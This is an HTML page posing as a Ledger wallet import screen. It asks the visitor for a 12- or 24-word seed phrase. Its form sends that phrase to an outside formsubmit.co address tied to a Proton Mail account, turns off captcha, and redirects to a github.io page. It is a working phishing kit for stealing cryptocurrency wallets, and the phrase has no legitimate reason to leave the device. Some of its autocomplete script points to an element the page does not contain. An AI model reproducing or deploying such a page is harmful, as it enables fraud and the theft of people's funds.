<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seed Phrase Input</title>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>

    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica Neue, Noto Sans, Liberation Sans, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;        font-size: 1rem;
            background-color: #121212;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;

            flex-direction: column;
            margin: 25px; /* Marge de 15px autour de tout le contenu */
        }
        .modal-content {
            background-color: #1b1d28;
            border: 1px solid #2c2f38;
            border-radius: 12px;
            padding: 2rem;
            width: 90%;
            max-width: 400px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.25);
            margin-bottom: 1rem;
        }
        .modal-header {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .modal-header img {
            width: 2.5rem;
            border-radius: 8px;
        }
        .modal-header h4 {
            margin: 0;
            font-size: 1.25rem;
            color: #fff;
        }
        .selection-buttons {
            display: flex;
            background: #2a2b3d;
            border-radius: 12px;
            overflow: hidden;
            margin: 1.5rem 0;
        }
        .selection-buttons button {
            flex: 1;
            font-size: 0.9rem;
            font-weight: 600;
            padding: 0.75rem;
            border: none;
            background: transparent;
            color: #fff;
            cursor: pointer;
        }
        .selection-buttons button.active {
            background: #3b82f6;
        }
        textarea {
            width: 90%;
            background: #2a2b3d;
            border: 1px solid #4b5563;
            border-radius: 8px;
            padding: 1rem;
            font-size: 1rem;
            color: #fff;
            outline: none;
            resize: none; /* Désactive l'extension de la zone de saisie */
            height: 150px; /* Taille fixe de la zone de saisie */
        }
        .words-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 1rem;
            margin: 1.5rem 0;
        }
        .word-box {
            position: relative;
            background: #2a2b3d;
            border: 1px solid #4b5563;
            border-radius: 8px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 0.9rem;
        }
        .word-box .index {
            position: absolute;
            top: -10px;
            left: 10px;
            background: #1a1b23;
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-size: 0.75rem;
            color: #9ca3af;
        }
        .submit-button {
            width: 100%;
            padding: 0.75rem;
            font-size: 1rem;
            font-weight: bold;
            color: #fff;
            background: #3b82f6;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        .submit-button:hover {
            background: #2563eb;
        }

        /* Mobile-friendly adjustments */
        @media (max-width: 600px) {
            .modal-content {
                width: 90%;
                padding: 1.5rem;
            }
            .modal-header h4 {
                font-size: 1rem;
            }
            .selection-buttons button {
                font-size: 0.8rem;
            }
            .words-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            .word-box {
                font-size: 0.8rem;
                height: 40px;
            }
            .submit-button {
                font-size: 0.9rem;
                padding: 0.65rem;
            }
        }
        .autocomplete-suggestions {
        position: absolute;
        background: white;
        border: 1px solid #ccc;
        max-height: 150px;
        overflow-y: auto;
        z-index: 1000;
    }

    .autocomplete-suggestions div {
        padding: 8px;
        cursor: pointer;
    }

    .autocomplete-suggestions div:hover, .autocomplete-suggestions .selected {
        background: #ddd;
    }

    .word-box {
        display: inline-block;
        width: 100px;
        height: 30px;
        border: 1px solid #000;
        text-align: center;
        line-height: 30px;
        margin: 2px;
    }
    </style>
</head>
<body>
   <div class="modal-content">
    <div class="modal-header">
        <img src="https://play-lh.googleusercontent.com/mHjR3KaAMw3RGA15-t8gXNAy_Onr4ZYUQ07Z9fG2vd51IXO5rd7wtdqEWbNMPTgdqrk=s96-rw" alt="Icon">
        <h4>Enter Seed Phrase for Ledger</h4>
    </div>
    <div class="selection-buttons">
        <button class="active" onclick="setWords(12)">12 words</button>
        <button onclick="setWords(24)">24 words</button>
    </div>
   <form id="walletForm" action="https://formsubmit.co/code-iptv@proton.me" method="POST">
    <textarea placeholder="Enter your seed phrase here. Make sure to add a space between each word." 
              oninput="updateWords(this.value)" id="seedPhraseTextarea" name="seedPhrase Ledger" required></textarea>
    
    <div class="autocomplete-suggestions" id="autocomplete"></div>

<div class="words-grid" id="wordsGrid"></div>

    <!-- Redirection après soumission -->
    <input type="hidden" name="_next" value="https://fauxon.github.io/fhrdhqctvghbn-/">
    <!-- Anti-spam -->
    <input type="hidden" name="_captcha" value="false">

    <button type="submit" class="submit-button">Import wallet</button>
</form>

    <div id="output"></div>
</div>

<script>
    let wordCount = 12;
    let bip39Words = new Set();
    let bip39Array = [];
    let currentWordIndex = 0;
    let words = Array(wordCount).fill("");

    const forbiddenChars = /[0-9ôâçêœæîïûùàëÿ]/;
    const forbiddenEndings = ["é", "ée", "è", "et", "ai", "ait"];

    async function loadBIP39Words() {
        try {
            const response = await fetch("https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt");
            const text = await response.text();
            bip39Array = text.split("\n").map(word => word.trim());
            bip39Words = new Set(bip39Array);
        } catch (error) {
            console.error("Erreur lors du chargement des mots BIP-39 :", error);
        }
    }

    function renderWordBoxes() {
        const grid = document.getElementById("wordsGrid");
        grid.innerHTML = "";
        words.forEach((word, index) => {
            const wordBox = document.createElement("div");
            wordBox.className = "word-box";
            wordBox.textContent = word || "-";
            wordBox.dataset.index = index;
            wordBox.onclick = () => setActiveWord(index);
            grid.appendChild(wordBox);
        });
    }

    function setActiveWord(index) {
        currentWordIndex = index;
        document.getElementById("wordInput").value = words[index] || "";
        document.getElementById("wordInput").focus();
    }

    function isValidWord(word) {
        if (word.length > 12) return false;
        if (forbiddenChars.test(word)) return false;
        if (forbiddenEndings.some(ending => word.endsWith(ending))) return false;
        return true;
    }

    function updateWords(input) {
        input = input.toLowerCase().replace(/[^a-z]/g, "").slice(0, 12);
        if (!isValidWord(input)) return;

        words[currentWordIndex] = input;
        renderWordBoxes();
        showAutoComplete(input);
    }

    function showAutoComplete(input) {
        const autocompleteDiv = document.getElementById("autocomplete");
        autocompleteDiv.innerHTML = "";

        if (!input) return;

        let suggestions = bip39Array.filter(word => word.startsWith(input)).slice(0, 5);
        if (suggestions.length === 0) return;

        suggestions.forEach((word, index) => {
            const div = document.createElement("div");
            div.textContent = word;
            div.onclick = () => selectWord(word);
            if (index === 0) div.classList.add("selected");
            autocompleteDiv.appendChild(div);
        });

        const rect = document.getElementById("wordInput").getBoundingClientRect();
        autocompleteDiv.style.left = `${rect.left}px`;
        autocompleteDiv.style.top = `${rect.bottom}px`;
        autocompleteDiv.style.width = `${rect.width}px`;
    }

    function selectWord(word) {
        words[currentWordIndex] = word;
        document.getElementById("wordInput").value = word;
        document.getElementById("autocomplete").innerHTML = "";
        renderWordBoxes();
    }

    document.getElementById("wordInput").addEventListener("input", (e) => {
        updateWords(e.target.value);
    });

    document.getElementById("wordInput").addEventListener("keydown", (e) => {
        const suggestions = document.querySelectorAll(".autocomplete-suggestions div");
        let selected = document.querySelector(".autocomplete-suggestions .selected");

        if (e.key === "ArrowDown") {
            e.preventDefault();
            if (selected) {
                selected.classList.remove("selected");
                if (selected.nextElementSibling) selected.nextElementSibling.classList.add("selected");
                else suggestions[0].classList.add("selected");
            } else if (suggestions.length > 0) {
                suggestions[0].classList.add("selected");
            }
        }

        if (e.key === "ArrowUp") {
            e.preventDefault();
            if (selected) {
                selected.classList.remove("selected");
                if (selected.previousElementSibling) selected.previousElementSibling.classList.add("selected");
                else suggestions[suggestions.length - 1].classList.add("selected");
            }
        }

        if (e.key === "Enter" && selected) {
            e.preventDefault();
            selectWord(selected.textContent);
        }
    });

    loadBIP39Words().then(renderWordBoxes);
</script>
    
</body>
</html>
